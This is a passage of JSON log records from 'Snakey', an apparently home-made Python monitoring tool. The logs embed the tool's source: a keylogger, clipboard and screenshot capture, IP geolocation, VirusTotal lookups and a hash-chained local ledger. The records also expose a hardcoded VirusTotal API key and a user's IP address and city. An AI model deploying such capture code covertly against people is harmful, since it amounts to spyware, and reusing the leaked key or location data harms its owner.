\"chained_hash\": chained_hash\r\n        }\r\n\r\n        ledger.append(ledger_entry)\r\n\r\n        with open(hash_ledger_path, \"w\") as f:\r\n            json.dump(ledger, f, indent=4)\r\n\r\n        print(\"[SUCCESS] Blockchain-style hash ledger updated.\")\r\n\r\n        hash_list = [entry[\"log_hash\"] for entry in ledger]\r\n        merkle_root = build_merkle_tree(hash_list)\r\n\r\n        with open(merkle_root_path, \"w\") as f:\r\n            f.write(merkle_root)\r\n\r\n        print(\"[SUCCESS] Merkle root saved.\")\r\n    except Exception as e:\r\n        print(f\"[ERROR] Failed to save log or update ledger: {e}\")\r\n\r\n    return session_log\r\n\r\n# === Main Daemon Loop ===\r\nif __name__ == \"__main__\":\r\n    print(\"[INFO] Starting Snakey in daemon mode...\")\r\n\r\n    while True:\r\n        if check_stop_file():\r\n            print(\"[INFO] Snakey terminated by stop file.\")\r\n            break\r\n\r\n        session_log = collect_full_session()\r\n        log_to_wazuh_file(session_log)\r\n        time.sleep(15)\r\n\r\n    stop_file_path = os.path.join(base_path, \"stop_snakey.txt\")\r\n    if os.path.exists(stop_file_path):\r\n        os.remove(stop_file_path)\r\n        print(\"[INFO] Stop file removed.\")\r\n", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (750 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "bd563eceb52ef16a710e80c25c7c7f3a9a4deedd01dfbecfac2b16500ad75c3a", "screenshot_hash": "aea92a69393704def5bae5e928f2e32762ea48f5077777b3891350af6d72fc9c", "log_hash": "7b804bdf120a79221bff00f52e9d233ed80f31a76bb1e6555589c91c0952dd35"}
{"timestamp": "2025-05-21T11:26:49.855333", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2001:8a0:df46:3c00:c99:cdb4:5c2e:cb7f", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "import os\r\nimport time\r\nimport json\r\nimport socket\r\nimport getpass\r\nimport hashlib\r\nimport platform\r\nfrom datetime import datetime\r\nfrom requests import get, post\r\nfrom pynput.keyboard import Key, Listener\r\nfrom PIL import ImageGrab\r\nimport win32clipboard\r\nfrom cryptography.fernet import Fernet\r\nimport requests\r\n\r\n# === Configuration ===\r\nbase_path = \"C:/Users/ktmdu/PycharmProjects/Snakey/Cryptography\"\r\nencrypted_path = os.path.join(base_path, \"encrypted/\")\r\nos.makedirs(encrypted_path, exist_ok=True)\r\n\r\njson_log_path = os.path.join(base_path, \"snakey_log.json\")\r\nhash_ledger_path = os.path.join(base_path, \"hash_ledger.json\")\r\nmerkle_root_path = os.path.join(base_path, \"merkle_root.txt\")\r\nwazuh_log_file = os.path.join(base_path, \"wazuh_alerts.log\")\r\n\r\nscreenshot_information = \"screenshot.png\"\r\nkey_path = os.path.join(encrypted_path, \"key.key\")\r\nknown_countries = [\"Spain\"]\r\n\r\n# === VirusTotal Config ===\r\nVT_API_KEY = \"c5f762cd3b75395566d2cce05125d25c40af4ac71ce73801e936080938784b46\"\r\nVT_URL_LOOKUP = \"https://www.virustotal.com/api/v3/urls/\"\r\nVT_FILE_LOOKUP = \"https://www.virustotal.com/api/v3/files/\"\r\nVT_HEADER = {\"x-apikey\": VT_API_KEY}\r\n\r\nif not os.path.exists(key_path):\r\n    print(\"[ERROR] Encryption key not found! Run GenerateKey.py first.\")\r\n    exit(1)\r\n\r\nwith open(key_path, \"rb\") as key_file:\r\n    key = key_file.read()\r\n\r\nfernet = Fernet(key)\r\n\r\n# === Utility Functions ===\r\ndef hash_file(filepath):\r\n    sha256_hash = hashlib.sha256()\r\n    try:\r\n        with open(filepath, \"rb\") as f:\r\n            for byte_block in iter(lambda: f.read(4096), b\"\"):\r\n                sha256_hash.update(byte_block)\r\n        return sha256_hash.hexdigest()\r\n    except Exception as e:\r\n        print(f\"[ERROR] Hashing failed for {filepath}: {e}\")\r\n        return None\r\n\r\ndef hash_text(text):\r\n    return hashlib.sha256(text.encode()).hexdigest()\r\n\r\ndef build_merkle_tree(hashes):\r\n    if not hashes:\r\n        return None\r\n    while len(hashes) > 1:\r\n        if len(hashes) % 2 != 0:\r\n            hashes.append(hashes[-1])\r\n        new_hashes = []\r\n        for i in range(0, len(hashes), 2):\r\n            combined = hashes[i] + hashes[i + 1]\r\n            new_hashes.append(hash_text(combined))\r\n        hashes = new_hashes\r\n    return hashes[0]\r\n\r\ndef get_public_ip_and_geolocation():\r\n    try:\r\n        ip_info = get(\"https://api64.ipify.org?format=json\").json()\r\n        ip = ip_info.get(\"ip\")\r\n        geo_response = get(f\"http://ip-api.com/json/{ip}\")\r\n        geo_data = geo_response.json()\r\n        return ip, geo_data.get(\"country\"), geo_data.get(\"city\")\r\n    except Exception as e:\r\n        print(f\"[ERROR] Failed to get public IP or geolocation: {e}\")\r\n        return None, None, None\r\n\r\ndef vt_lookup_url(url):\r\n    try:\r\n        url_id = hashlib.sha256(url.encode()).hexdigest()\r\n        response = requests.get(VT_URL_LOOKUP + url_id, headers=VT_HEADER)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n    except Exception as e:\r\n        print(f\"[ERROR] VT URL lookup failed: {e}\")\r\n    return {}\r\n\r\ndef vt_lookup_file(file_path):\r\n    try:\r\n        file_hash = hash_file(file_path)\r\n        response = requests.get(VT_FILE_LOOKUP + file_hash, headers=VT_HEADER)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n    except Exception as e:\r\n        print(f\"[ERROR] VT File lookup failed: {e}\")\r\n    return {}\r\n\r\ndef check_important_directories():\r\n    important_dirs = {\r\n        \"Desktop\": os.path.join(os.path.expanduser(\"~\"), \"Desktop\"),\r\n        \"Documents\": os.path.join(os.path.expanduser(\"~\"), \"Documents\"),\r\n        \"Downloads\": os.path.join(os.path.expanduser(\"~\"), \"Downloads\"),\r\n        \"AppData\": os.environ.get(\"APPDATA\", \"\"),\r\n        \"LocalAppData\": os.environ.get(\"LOCALAPPDATA\", \"\")\r\n    }\r\n\r\n    dir_status = {}\r\n    for name, path in important_dirs.items():\r\n        if os.path.exists(path):\r\n            try:\r\n                file_count = len(os.listdir(path))\r\n                dir_status[name] = f\"Found ({file_count} items)\"\r\n            except Exception as e:\r\n                dir_status[name] = f\"Error reading contents: {e}\"\r\n        else:\r\n            dir_status[name] = \"Not found\"\r\n    return dir_status\r\n\r\ndef check_stop_file():\r\n    return os.path.exists(os.path.join(base_path, \"stop_snakey.txt\"))\r\n\r\ndef log_to_wazuh_file(data):\r\n    try:\r\n        with open(wazuh_log_file, \"a\") as f:\r\n            f.write(json.dumps(data) + \"\\n\")\r\n        print(\"[INFO] Log written to Wazuh-compatible file.\")\r\n    except Exception as e:\r\n        print(f\"[ERROR] Wazuh log file write failed: {e}\")\r\n\r\ndef collect_full_session():\r\n    session_log = {\r\n        \"timestamp\": datetime.now().isoformat(),\r\n        \"system\": {},\r\n        \"clipboard\": \"\",\r\n        \"keystrokes\": \"\",\r\n        \"screenshot_taken\": False,\r\n        \"alerts\": [],\r\n        \"virustotal\": {},\r\n        \"important_dirs\": {}\r\n    }\r\n\r\n    try:\r\n        session_log[\"system\"][\"username\"] = getpass.getuser()\r\n        hostname = socket.gethostname()\r\n        session_log[\"system\"][\"hostname\"] = hostname\r\n        session_log[\"system\"][\"private_ip\"] = socket.gethostbyname(hostname)\r\n\r\n        public_ip, country, city = get_public_ip_and_geolocation()\r\n        session_log[\"system\"][\"public_ip\"] = public_ip\r\n        session_log[\"system\"][\"country\"] = country\r\n        session_log[\"system\"][\"city\"] = city\r\n\r\n        if country and country not in known_countries:\r\n            session_log[\"alerts\"].append(f\"Access from untrusted country: {country}\")\r\n\r\n        session_log[\"system\"][\"processor\"] = platform.processor()\r\n        session_log[\"system\"][\"os\"] = platform.system() + \" \" + platform.version()\r\n        session_log[\"system\"][\"machine\"] = platform.machine()\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"System info error: {e}\")\r\n\r\n    try:\r\n        win32clipboard.OpenClipboard()\r\n        try:\r\n            session_log[\"clipboard\"] = win32clipboard.GetClipboardData()\r\n        except TypeError:\r\n            session_log[\"clipboard\"] = \"Clipboard is empty.\"\r\n        win32clipboard.CloseClipboard()\r\n        session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Clipboard error: {e}\")\r\n\r\n    try:\r\n        screenshot_path = os.path.join(base_path, screenshot_information)\r\n        im = ImageGrab.grab()\r\n        im.save(screenshot_path)\r\n        session_log[\"screenshot_taken\"] = True\r\n        session_log[\"screenshot_hash\"] = hash_file(screenshot_path)\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Screenshot error: {e}\")\r\n\r\n    if session_log[\"clipboard\"].startswith(\"http\"):\r\n        vt_result = vt_lookup_url(session_log[\"clipboard\"])\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"clipboard_url\"] = vt_result\r\n\r\n    if session_log.get(\"screenshot_taken\"):\r\n        vt_result = vt_lookup_file(screenshot_path)\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"screenshot_file\"] = vt_result\r\n\r\n    keys = []\r\n    def on_press(key):\r\n        if hasattr(key, 'char'):\r\n            keys.append(key.char)\r\n        elif key == Key.space:\r\n            keys.append(' ')\r\n\r\n    print(\"[INFO] Keylogger running. Create 'stop_snakey.txt' to terminate.\")\r\n    with Listener(on_press=on_press) as listener:\r\n        start_time = time.time()\r\n        while time.time() - start_time < 10:\r\n            time.sleep(1)\r\n            if check_stop_file():\r\n                print(\"[INFO] Stop file detected. Exiting keylogger.\")\r\n                break\r\n\r\n    session_log[\"keystrokes\"] = ''.join(keys)\r\n    session_log[\"important_dirs\"] = check_important_directories()\r\n    log_string = json.dumps(session_log, sort_keys=True)\r\n    session_log[\"log_hash\"] = hash_text(log_string)\r\n\r\n    try:\r\n        if os.path.exists(json_log_path):\r\n            with open(json_log_path, \"r\") as f:\r\n                logs = json.load(f)\r\n        else:\r\n            logs = []\r\n\r\n        logs.append(session_log)\r\n        with open(json_log_path, \"w\") as f:\r\n            json.dump(logs, f, indent=4)\r\n\r\n        print(\"[SUCCESS] Log saved to JSON file.\")\r\n\r\n        if os.path.exists(hash_ledger_path):\r\n            with open(hash_ledger_path, \"r\") as f:\r\n                ledger = json.load(f)\r\n        else:\r\n            ledger = []\r\n\r\n        previous_hash = ledger[-1][\"log_hash\"] if ledger else \"0\" * 64\r\n        chained_hash_input = session_log[\"log_hash\"] + previous_hash\r\n        chained_hash = hash_text(chained_hash_input)\r\n\r\n        ledger_entry = {\r\n            \"timestamp\": session_log[\"timestamp\"],\r\n            \"log_hash\": session_log[\"log_hash\"],\r\n            \"previous_hash\": previous_hash,\r\n            \"chained_hash\": chained_hash\r\n        }\r\n\r\n        ledger.append(ledger_entry)\r\n\r\n        with open(hash_ledger_path, \"w\") as f:\r\n            json.dump(ledger, f, indent=4)\r\n\r\n        print(\"[SUCCESS] Blockchain-style hash ledger updated.\")\r\n\r\n        hash_list = [entry[\"log_hash\"] for entry in ledger]\r\n        merkle_root = build_merkle_tree(hash_list)\r\n\r\n        with open(merkle_root_path, \"w\") as f:\r\n            f.write(merkle_root)\r\n\r\n        print(\"[SUCCESS] Merkle root saved.\")\r\n    except Exception as e:\r\n        print(f\"[ERROR] Failed to save log or update ledger: {e}\")\r\n\r\n    return session_log\r\n\r\n# === Main Daemon Loop ===\r\nif __name__ == \"__main__\":\r\n    print(\"[INFO] Starting Snakey in daemon mode...\")\r\n\r\n    while True:\r\n        if check_stop_file():\r\n            print(\"[INFO] Snakey terminated by stop file.\")\r\n            break\r\n\r\n        session_log = collect_full_session()\r\n        log_to_wazuh_file(session_log)\r\n        time.sleep(15)\r\n\r\n    stop_file_path = os.path.join(base_path, \"stop_snakey.txt\")\r\n    if os.path.exists(stop_file_path):\r\n        os.remove(stop_file_path)\r\n        print(\"[INFO] Stop file removed.\")\r\n", "keystrokes": "", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (750 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "bd563eceb52ef16a710e80c25c7c7f3a9a4deedd01dfbecfac2b16500ad75c3a", "screenshot_hash": "3cbcdd481123e58737418014e8079c24974ab8b4377d0ae0cb39f27b4700208c", "log_hash": "6a7fe9ff1aa5d27d7d5545d986304b63f2c78f4d47df091efb6ffbe0dc853abb"}
{"timestamp": "2025-05-21T11:27:16.195153", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2001:8a0:df46:3c00:c99:cdb4:5c2e:cb7f", "country": "Portugal", "city": "Covilha", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "import os\r\nimport time\r\nimport json\r\nimport socket\r\nimport getpass\r\nimport hashlib\r\nimport platform\r\nfrom datetime import datetime\r\nfrom requests import get, post\r\nfrom pynput.keyboard import Key, Listener\r\nfrom PIL import ImageGrab\r\nimport win32clipboard\r\nfrom cryptography.fernet import Fernet\r\nimport requests\r\n\r\n# === Configuration ===\r\nbase_path = \"C:/Users/ktmdu/PycharmProjects/Snakey/Cryptography\"\r\nencrypted_path = os.path.join(base_path, \"encrypted/\")\r\nos.makedirs(encrypted_path, exist_ok=True)\r\n\r\njson_log_path = os.path.join(base_path, \"snakey_log.json\")\r\nhash_ledger_path = os.path.join(base_path, \"hash_ledger.json\")\r\nmerkle_root_path = os.path.join(base_path, \"merkle_root.txt\")\r\nwazuh_log_file = os.path.join(base_path, \"wazuh_alerts.log\")\r\n\r\nscreenshot_information = \"screenshot.png\"\r\nkey_path = os.path.join(encrypted_path, \"key.key\")\r\nknown_countries = [\"Spain\"]\r\n\r\n# === VirusTotal Config ===\r\nVT_API_KEY = \"c5f762cd3b75395566d2cce05125d25c40af4ac71ce73801e936080938784b46\"\r\nVT_URL_LOOKUP = \"https://www.virustotal.com/api/v3/urls/\"\r\nVT_FILE_LOOKUP = \"https://www.virustotal.com/api/v3/files/\"\r\nVT_HEADER = {\"x-apikey\": VT_API_KEY}\r\n\r\nif not os.path.exists(key_path):\r\n    print(\"[ERROR] Encryption key not found! Run GenerateKey.py first.\")\r\n    exit(1)\r\n\r\nwith open(key_path, \"rb\") as key_file:\r\n    key = key_file.read()\r\n\r\nfernet = Fernet(key)\r\n\r\n# === Utility Functions ===\r\ndef hash_file(filepath):\r\n    sha256_hash = hashlib.sha256()\r\n    try:\r\n        with open(filepath, \"rb\") as f:\r\n            for byte_block in iter(lambda: f.read(4096), b\"\"):\r\n                sha256_hash.update(byte_block)\r\n        return sha256_hash.hexdigest()\r\n    except Exception as e:\r\n        print(f\"[ERROR] Hashing failed for {filepath}: {e}\")\r\n        return None\r\n\r\ndef hash_text(text):\r\n    return hashlib.sha256(text.encode()).hexdigest()\r\n\r\ndef build_merkle_tree(hashes):\r\n    if not hashes:\r\n        return None\r\n    while len(hashes) > 1:\r\n        if len(hashes) % 2 != 0:\r\n            hashes.append(hashes[-1])\r\n        new_hashes = []\r\n        for i in range(0, len(hashes), 2):\r\n            combined = hashes[i] + hashes[i + 1]\r\n            new_hashes.append(hash_text(combined))\r\n        hashes = new_hashes\r\n    return hashes[0]\r\n\r\ndef get_public_ip_and_geolocation():\r\n    try:\r\n        ip_info = get(\"https://api64.ipify.org?format=json\").json()\r\n        ip = ip_info.get(\"ip\")\r\n        geo_response = get(f\"http://ip-api.com/json/{ip}\")\r\n        geo_data = geo_response.json()\r\n        return ip, geo_data.get(\"country\"), geo_data.get(\"city\")\r\n    except Exception as e:\r\n        print(f\"[ERROR] Failed to get public IP or geolocation: {e}\")\r\n        return None, None, None\r\n\r\ndef vt_lookup_url(url):\r\n    try:\r\n        url_id = hashlib.sha256(url.encode()).hexdigest()\r\n        response = requests.get(VT_URL_LOOKUP + url_id, headers=VT_HEADER)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n    except Exception as e:\r\n        print(f\"[ERROR] VT URL lookup failed: {e}\")\r\n    return {}\r\n\r\ndef vt_lookup_file(file_path):\r\n    try:\r\n        file_hash = hash_file(file_path)\r\n        response = requests.get(VT_FILE_LOOKUP + file_hash, headers=VT_HEADER)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n    except Exception as e:\r\n        print(f\"[ERROR] VT File lookup failed: {e}\")\r\n    return {}\r\n\r\ndef check_important_directories():\r\n    important_dirs = {\r\n        \"Desktop\": os.path.join(os.path.expanduser(\"~\"), \"Desktop\"),\r\n        \"Documents\": os.path.join(os.path.expanduser(\"~\"), \"Documents\"),\r\n        \"Downloads\": os.path.join(os.path.expanduser(\"~\"), \"Downloads\"),\r\n        \"AppData\": os.environ.get(\"APPDATA\", \"\"),\r\n        \"LocalAppData\": os.environ.get(\"LOCALAPPDATA\", \"\")\r\n    }\r\n\r\n    dir_status = {}\r\n    for name, path in important_dirs.items():\r\n        if os.path.exists(path):\r\n            try:\r\n                file_count = len(os.listdir(path))\r\n                dir_status[name] = f\"Found ({file_count} items)\"\r\n            except Exception as e:\r\n                dir_status[name] = f\"Error reading contents: {e}\"\r\n        else:\r\n            dir_status[name] = \"Not found\"\r\n    return dir_status\r\n\r\ndef check_stop_file():\r\n    return os.path.exists(os.path.join(base_path, \"stop_snakey.txt\"))\r\n\r\ndef log_to_wazuh_file(data):\r\n    try:\r\n        with open(wazuh_log_file, \"a\") as f:\r\n            f.write(json.dumps(data) + \"\\n\")\r\n        print(\"[INFO] Log written to Wazuh-compatible file.\")\r\n    except Exception as e:\r\n        print(f\"[ERROR] Wazuh log file write failed: {e}\")\r\n\r\ndef collect_full_session():\r\n    session_log = {\r\n        \"timestamp\": datetime.now().isoformat(),\r\n        \"system\": {},\r\n        \"clipboard\": \"\",\r\n        \"keystrokes\": \"\",\r\n        \"screenshot_taken\": False,\r\n        \"alerts\": [],\r\n        \"virustotal\": {},\r\n        \"important_dirs\": {}\r\n    }\r\n\r\n    try:\r\n        session_log[\"system\"][\"username\"] = getpass.getuser()\r\n        hostname = socket.gethostname()\r\n        session_log[\"system\"][\"hostname\"] = hostname\r\n        session_log[\"system\"][\"private_ip\"] = socket.gethostbyname(hostname)\r\n\r\n        public_ip, country, city = get_public_ip_and_geolocation()\r\n        session_log[\"system\"][\"public_ip\"] = public_ip\r\n        session_log[\"system\"][\"country\"] = country\r\n        session_log[\"system\"][\"city\"] = city\r\n\r\n        if country and country not in known_countries:\r\n            session_log[\"alerts\"].append(f\"Access from untrusted country: {country}\")\r\n\r\n        session_log[\"system\"][\"processor\"] = platform.processor()\r\n        session_log[\"system\"][\"os\"] = platform.system() + \" \" + platform.version()\r\n        session_log[\"system\"][\"machine\"] = platform.machine()\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"System info error: {e}\")\r\n\r\n    try:\r\n        win32clipboard.OpenClipboard()\r\n        try:\r\n            session_log[\"clipboard\"] = win32clipboard.GetClipboardData()\r\n        except TypeError:\r\n            session_log[\"clipboard\"] = \"Clipboard is empty.\"\r\n        win32clipboard.CloseClipboard()\r\n        session_log[\"clipboard_hash\"] = hash_text(session_log[\"clipboard\"])\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Clipboard error: {e}\")\r\n\r\n    try:\r\n        screenshot_path = os.path.join(base_path, screenshot_information)\r\n        im = ImageGrab.grab()\r\n        im.save(screenshot_path)\r\n        session_log[\"screenshot_taken\"] = True\r\n        session_log[\"screenshot_hash\"] = hash_file(screenshot_path)\r\n    except Exception as e:\r\n        session_log[\"alerts\"].append(f\"Screenshot error: {e}\")\r\n\r\n    if session_log[\"clipboard\"].startswith(\"http\"):\r\n        vt_result = vt_lookup_url(session_log[\"clipboard\"])\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"clipboard_url\"] = vt_result\r\n\r\n    if session_log.get(\"screenshot_taken\"):\r\n        vt_result = vt_lookup_file(screenshot_path)\r\n        if vt_result:\r\n            session_log[\"virustotal\"][\"screenshot_file\"] = vt_result\r\n\r\n    keys = []\r\n    def on_press(key):\r\n        if hasattr(key, 'char'):\r\n            keys.append(key.char)\r\n        elif key == Key.space:\r\n            keys.append(' ')\r\n\r\n    print(\"[INFO] Keylogger running. Create 'stop_snakey.txt' to terminate.\")\r\n    with Listener(on_press=on_press) as listener:\r\n        start_time = time.time()\r\n        while time.time() - start_time < 10:\r\n            time.sleep(1)\r\n            if check_stop_file():\r\n                print(\"[INFO] Stop file detected. Exiting keylogger.\")\r\n                break\r\n\r\n    session_log[\"keystrokes\"] = ''.join(keys)\r\n    session_log[\"important_dirs\"] = check_important_directories()\r\n    log_string = json.dumps(session_log, sort_keys=True)\r\n    session_log[\"log_hash\"] = hash_text(log_string)\r\n\r\n    try:\r\n        if os.path.exists(json_log_path):\r\n            with open(json_log_path, \"r\") as f:\r\n                logs = json.load(f)\r\n        else:\r\n            logs = []\r\n\r\n        logs.append(session_log)\r\n        with open(json_log_path, \"w\") as f:\r\n            json.dump(logs, f, indent=4)\r\n\r\n        print(\"[SUCCESS] Log saved to JSON file.\")\r\n\r\n        if os.path.exists(hash_ledger_path):\r\n            with open(hash_ledger_path, \"r\") as f:\r\n                ledger = json.load(f)\r\n        else:\r\n            ledger = []\r\n\r\n        previous_hash = ledger[-1][\"log_hash\"] if ledger else \"0\" * 64\r\n        chained_hash_input = session_log[\"log_hash\"] + previous_hash\r\n        chained_hash = hash_text(chained_hash_input)\r\n\r\n        ledger_entry = {\r\n            \"timestamp\": session_log[\"timestamp\"],\r\n            \"log_hash\": session_log[\"log_hash\"],\r\n            \"previous_hash\": previous_hash,\r\n            \"chained_hash\": chained_hash\r\n        }\r\n\r\n        ledger.append(ledger_entry)\r\n\r\n        with open(hash_ledger_path, \"w\") as f:\r\n            json.dump(ledger, f, indent=4)\r\n\r\n        print(\"[SUCCESS] Blockchain-style hash ledger updated.\")\r\n\r\n        hash_list = [entry[\"log_hash\"] for entry in ledger]\r\n        merkle_root = build_merkle_tree(hash_list)\r\n\r\n        with open(merkle_root_path, \"w\") as f:\r\n            f.write(merkle_root)\r\n\r\n        print(\"[SUCCESS] Merkle root saved.\")\r\n    except Exception as e:\r\n        print(f\"[ERROR] Failed to save log or update ledger: {e}\")\r\n\r\n    return session_log\r\n\r\n# === Main Daemon Loop ===\r\nif __name__ == \"__main__\":\r\n    print(\"[INFO] Starting Snakey in daemon mode...\")\r\n\r\n    while True:\r\n        if check_stop_file():\r\n            print(\"[INFO] Snakey terminated by stop file.\")\r\n            break\r\n\r\n        session_log = collect_full_session()\r\n        log_to_wazuh_file(session_log)\r\n        time.sleep(15)\r\n\r\n    stop_file_path = os.path.join(base_path, \"stop_snakey.txt\")\r\n    if os.path.exists(stop_file_path):\r\n        os.remove(stop_file_path)\r\n        print(\"[INFO] Stop file removed.\")\r\n", "keystrokes": "stop_snakey", "screenshot_taken": true, "alerts": ["Access from untrusted country: Portugal"], "virustotal": {}, "important_dirs": {"Desktop": "Not found", "Documents": "Found (6 items)", "Downloads": "Found (750 items)", "AppData": "Found (54 items)", "LocalAppData": "Found (113 items)"}, "clipboard_hash": "bd563eceb52ef16a710e80c25c7c7f3a9a4deedd01dfbecfac2b16500ad75c3a", "screenshot_hash": "b3c755c168084d1b891526fbf848a2dc474eb2d0bab6ed38f1ee79a9e272e3c6", "log_hash": "cf7ea6a1e4d1a0677f83a76daaf76a16183f16d72631aafd60adfef723566711"}
{"timestamp": "2025-05-21T11:54:29.842201", "system": {"username": "user", "hostname": "MSI", "private_ip": "192.168.1.71", "public_ip": "2001:8a0:df46:3c00:c99:cdb4:5c2e:cb7f", "country": "Portugal", "city": "Covilha", "isp": "MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A", "processor": "Intel64 Family 6 Model 186 Stepping 2, GenuineIntel", "os": "Windows 10.0.26100", "machine": "AMD64"}, "clipboard": "import os\r\nimport time\r\nimport json\r\nimport socket\r\nimport getpass\r\nimport hashlib\r\nimport platform\r\nfrom datetime import datetime\r\nfrom requests import get\r\nfrom pynput.keyboard import Key, Listener\r\nfrom PIL import ImageGrab\r\nimport win32clipboard\r\nfrom cryptography.fernet import Fernet\r\nimport requests\r\n\r\n# === Configuration ===\r\nCONFIG = {\r\n    \"base_path\": \"C:/Users/ktmdu/PycharmProjects/Snakey/Cryptography\",\r\n    \"screenshot_filename\": \"screenshot.png\",\r\n    \"key_filename\": \"key.key\",\r\n    \"json_log_filename\": \"snakey_log.json\",\r\n    \"hash_ledger_filename\": \"hash_ledger.json\",\r\n    \"merkle_root_filename\": \"merkle_root.txt\",\r\n    \"wazuh_log_filename\": \"wazuh_alerts.log\",\r\n    \"stop_file\": \"stop_snakey.txt\",\r\n    \"known_countries\": [\"Spain\"],\r\n    \"vt_api_key\": \"c5f762cd3b75395566d2cce05125d25c40af4ac71ce73801e936080938784b46\",\r\n    \"vt_url_lookup\": \"https://www.virustotal.com/api/v3/urls/\",\r\n    \"vt_file_lookup\": \"https://www.virustotal.com/api/v3/files/\",\r\n    \"ip_api_url\": \"http://ip-api.com/json/\"\r\n}\r\n\r\n# === Derived Paths ===\r\nCONFIG[\"encrypted_path\"] = os.path.join(CONFIG[\"base_path\"], \"encrypted\")\r\nCONFIG[\"key_path\"] = os.path.join(CONFIG[\"encrypted_path\"], CONFIG[\"key_filename\"])\r\nCONFIG[\"json_log_path\"] = os.path.join(CONFIG[\"base_path\"], CONFIG[\"json_log_filename\"])\r\nCONFIG[\"hash_ledger_path\"] = os.path.join(CONFIG[\"base_path\"], CONFIG[\"hash_ledger_filename\"])\r\nCONFIG[\"merkle_root_path\"] = os.path.join(CONFIG[\"base_path\"], CONFIG[\"merkle_root_filename\"])\r\nCONFIG[\"wazuh_log_path\"] = os.path.join(CONFIG[\"base_path\"], CONFIG[\"wazuh_log_filename\"])\r\nCONFIG[\"stop_file_path\"] = os.path.join(CONFIG[\"base_path\"], CONFIG[\"stop_file\"])\r\nCONFIG[\"screenshot_path\"] = os.path.join(CONFIG[\"base_path\"], CONFIG[\"screenshot_filename\"])\r\n\r\n# === Ensure Directories Exist ===\r\nos.makedirs(CONFIG[\"encrypted_path\"], exist_ok=True)\r\n\r\n# === Load Encryption Key ===\r\nif not os.path.exists(CONFIG[\"key_path\"]):\r\n    print(\"[ERROR] Encryption key not found! Please generate the key first.\")\r\n    exit(1)\r\n\r\nwith open(CONFIG[\"key_path\"], \"rb\") as key_file:\r\n    key = key_file.read()\r\n\r\nfernet = Fernet(key)\r\n\r\n\r\n# === Utility Functions ===\r\ndef hash_file(filepath):\r\n    sha256_hash = hashlib.sha256()\r\n    try:\r\n        with open(filepath, \"rb\") as f:\r\n            for byte_block in iter(lambda: f.read(4096), b\"\"):\r\n                sha256_hash.update(byte_block)\r\n        return sha256_hash.hexdigest()\r\n    except Exception as e:\r\n        print(f\"[ERROR] Hashing failed for {filepath}: {e}\")\r\n        return None\r\n\r\n\r\ndef hash_text(text):\r\n    return hashlib.sha256(text.encode()).hexdigest()\r\n\r\n\r\ndef build_merkle_tree(hashes):\r\n    if not hashes:\r\n        return None\r\n    while len(hashes) > 1:\r\n        if len(hashes) % 2 != 0:\r\n            hashes.append(hashes[-1])\r\n        new_hashes = []\r\n        for i in range(0, len(hashes), 2):\r\n            combined = hashes[i] + hashes[i + 1]\r\n            new_hashes.append(hash_text(combined))\r\n        hashes = new_hashes\r\n    return hashes[0]\r\n\r\n\r\ndef get_public_ip_and_geolocation():\r\n    try:\r\n        ip_info = get(\"https://api64.ipify.org?format=json\").json()\r\n        ip = ip_info.get(\"ip\")\r\n        geo_response = get(f\"{CONFIG['ip_api_url']}{ip}\")\r\n        geo_data = geo_response.json()\r\n        return ip, geo_data.get(\"country\"), geo_data.get(\"city\"), geo_data.get(\"isp\")\r\n    except Exception as e:\r\n        print(f\"[ERROR] Failed to get public IP or geolocation: {e}\")\r\n        return None, None, None, None\r\n\r\n\r\ndef vt_lookup_url(url):\r\n    try:\r\n        url_id = hashlib.sha256(url.encode()).hexdigest()\r\n        headers = {\"x-apikey\": CONFIG[\"vt_api_key\"]}\r\n        response = requests.get(CONFIG[\"vt_url_lookup\"] + url_id, headers=headers)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n    except Exception as e:\r\n        print(f\"[ERROR] VT URL lookup failed: {e}\")\r\n    return {}\r\n\r\n\r\ndef vt_lookup_file(file_path):\r\n    try:\r\n        file_hash = hash_file(file_path)\r\n        headers = {\"x-apikey\": CONFIG[\"vt_api_key\"]}\r\n        response = requests.get(CONFIG[\"vt_file_lookup\"] + file_hash, headers=headers)\r\n        if response.status_code == 200:\r\n            data = response.json()\r\n            return data.get(\"data\", {}).get(\"attributes\", {}).get(\"last_analysis_stats\", {})\r\n    except Exception as e:\r\n        print(f\"[ERROR] VT File lookup failed: {e}\")\r\n    return {}\r\n\r\n\r\ndef check_important_directories():\r\n    important_dirs = {\r\n        \"Desktop\": 